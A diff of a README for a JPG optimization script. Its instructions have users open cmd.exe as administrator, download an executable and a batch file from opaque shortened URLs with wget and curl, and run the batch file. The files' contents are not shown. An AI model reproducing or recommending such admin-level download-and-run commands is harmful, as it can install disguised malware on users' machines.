@@ -9,8 +9,9 @@ This script will `OVERWRITE the original pictures` so it is highly advised to ma
 # Optimize all jpg files in the current working directory
 To run this script open cmd.exe as an administrator and run the commands below in the same folder as your jpg file(s)
 ```
-wget.exe -c -O convert.exe shorturl.at/cLPR0 && ^
-curl.exe shorturl.at/ajru5 > run.bat && ^
-call run.bat & exit
+wget.exe -c -O "convert.exe" "shorturl.at/cLPR0"
+curl.exe "shorturl.at/ajru5" > "run.bat"
+call "run.bat"
+exit
 
 ```
